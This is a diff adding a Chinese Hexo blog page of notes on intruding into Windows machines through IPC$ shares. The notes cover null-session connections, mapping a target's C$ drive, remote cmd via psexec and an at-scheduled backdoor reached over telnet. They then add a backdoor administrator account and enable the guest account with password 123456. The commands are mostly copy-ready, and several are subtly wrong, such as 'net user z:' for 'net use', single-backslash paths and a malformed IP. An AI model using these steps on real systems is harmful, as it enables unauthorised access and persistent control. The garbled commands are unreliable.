@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>IPC 入侵 | 空空随笔</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="IPC$    IPC$(Internet Process Connection)可以被理解为一种“专用管道”.可以在连接双方建立一条安全的通道，实现对远程计算机的访问。    Windows NT&#x2F;2000&#x2F;XP提供了IPC$功能的同时，在初次安装系统时还打开了默认共享，即所有的逻辑共享(C$,D$,E$……)和系统目录(ADMIN$)共享。    所有这些共享的目的，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IPC 入侵">
+<meta property="og:url" content="http://example.com/2023/01/09/ipc/index.html">
+<meta property="og:site_name" content="空空随笔">
+<meta property="og:description" content="IPC$    IPC$(Internet Process Connection)可以被理解为一种“专用管道”.可以在连接双方建立一条安全的通道，实现对远程计算机的访问。    Windows NT&#x2F;2000&#x2F;XP提供了IPC$功能的同时，在初次安装系统时还打开了默认共享，即所有的逻辑共享(C$,D$,E$……)和系统目录(ADMIN$)共享。    所有这些共享的目的，">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-01-09T07:20:27.463Z">
+<meta property="article:modified_time" content="2023-01-10T09:11:09.227Z">
+<meta property="article:author" content="两袖空空">
+<meta property="article:tag" content="Domain">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="空空随笔" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">空空随笔</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">随手记</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-ipc" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/01/09/ipc/" class="article-date">
+  <time class="dt-published" datetime="2023-01-09T07:20:27.463Z" itemprop="datePublished">2023-01-09</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Domain/">Domain</a>►<a class="article-category-link" href="/categories/IPC/">IPC</a>►<a class="article-category-link" href="/categories/Intranet/">Intranet</a>►<a class="article-category-link" href="/categories/Intranet/IPC/">IPC</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      IPC 入侵
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <ul>
+<li></li>
+</ul>
+<p>IPC$<br>    IPC$(Internet Process Connection)可以被理解为一种“专用管道”.可以在连接双方建立一条安全的通道，实现对远程计算机的访问。<br>    Windows NT&#x2F;2000&#x2F;XP提供了IPC$功能的同时，在初次安装系统时还打开了默认共享，即所有的逻辑共享(C$,D$,E$……)和系统目录(ADMIN$)共享。<br>    所有这些共享的目的，都是为了方便管理员的管理，但在有意无意中，导致了系统安全性的隐患<br>    Windows XP安装后的默认共享方式就是”仅来宾”的方式。<br>    利用IPC$,连接者甚至可以与目标主机建立一个空的连接而无需用户名与密码(对方机器开了ipc$共享,否则连接不上的)<br>    而利用这个空的连接，连接者还可以得到目标主机上的用户列表(管理员会禁止导出用户列表的)。<br>    以空连接登陆时,没有任何权限,以用户或管理员的身份登陆时,你就会有相应的权限</p>
+<p>错误号 5 ，拒绝访问：很可能你使用的用户不是管理员权限的；<br>错误号 51 ， Windows 无法找到网络路径：网络有问题；<br>错误号 53 ，找不到网络路径： ip 地址错误；目标未开机；目标 lanmanserver 服务未启动；目标有防火墙（端口过滤）；<br>错误号 67 ，找不到网络名：你的 lanmanworkstation 服务未启动或者目标删除了 ipc$ ；<br>错误号 1219 ，提供的凭据与已存在的凭据集冲突：你已经和对方建立了一个 ipc$ ，请删除再连；<br>错误号 1326 ，未知的用户名或错误密码：原因很明显了；<br>错误号 1792 ，试图登录，但是网络登录服务没有启动：目标 NetLogon 服务未启动；<br>错误号 2242 ，此用户的密码已经过期：目标有帐号策略，强制定期要求更改密码。</p>
+<p>查看本地共享<br>net share </p>
+<p>删除共享<br>net share C$ &#x2F;del</p>
+<p>关闭共享<br>net stop server &#x2F;y  (重启会自动开启)<br>建立空连接<br>    net use \10.61.10.130\ipc$ &#x2F;user:”” “”</p>
+<p>建立IPC$ 连接<br>    net use \10.61.10.130\ipc$ “”  &#x2F;user:””<br>查看远程主机的时间<br>    net time \10.61.10.130</p>
+<p>查看远程主机的共享服务 (看不见默认共享的)<br>    net view \10.61.10.130</p>
+<p>远程主机映射<br>    net user z: \10.61.10.130\c$<br>    成功后 你的Z盘就是130主机的C盘</p>
+<p>删除映射盘<br>    net use z: &#x2F;del</p>
+<p>远程开启cmd<br>    psexec.exe  -accepteula \10.61.10.130  -u “”  -p “”  cmd </p>
+<p>开启at定时任务<br>    复制文件并远程运行srv.exe （at \ip 时间 程序名）<br>    at \10.61.10.130 12:05 srv.exe 需要目标开启了 “Task Scheduler”服务<br>    接着连接该后门<br>    telnet 10.61.10.130 99  99 为srv.exe 开启的一次性后门<br>    cmd&gt;net start telnet<br>    cmd&gt;copy ntlm.exe \10.61.10.130\admin$\system32	ntlm 用来更改telnet身份验证的<br>    cmd&gt;ntlm.exe<br>    cmd&gt;net start telnet<br>    cmd&gt;telnet 10.61.10.130 23<br>    cmd&gt;net user ysh !QAZ2wsx &#x2F;add<br>    cmd&gt;net localgroup administrators ysh &#x2F;add<br>    cmd&gt;net user guest &#x2F;active:yes<br>    cmd&gt;net user guest 123456<br>    cmd&gt;net localgroup administrators guest &#x2F;add</p>
+<p>删除at定时任务<br>    at \10.10.61.10.130 1 &#x2F;del </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/01/09/ipc/" data-id="clcre41jr000tecvp70a107bu" data-title="IPC 入侵" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Domain/" rel="tag">Domain</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/01/09/dns/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          DNS
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/01/09/AV/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">AV</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AV/">AV</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Domain/">Domain</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/IPC/">IPC</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intranet/">Intranet</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Intranet/IPC/">IPC</a></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AV/" rel="tag">AV</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Domain/" rel="tag">Domain</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/AV/" style="font-size: 10px;">AV</a> <a href="/tags/Domain/" style="font-size: 10px;">Domain</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">一月 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/MS17-010">MS17-010</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/09/%E5%BC%BA%E8%A1%8C%E6%94%B9%E5%BC%80%E6%9C%BA%E5%AF%86%E7%A0%81/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/09/zzcms%E6%BC%8F%E6%B4%9E/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/09/zzcms%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/09/ZimbraNote/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 两袖空空<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
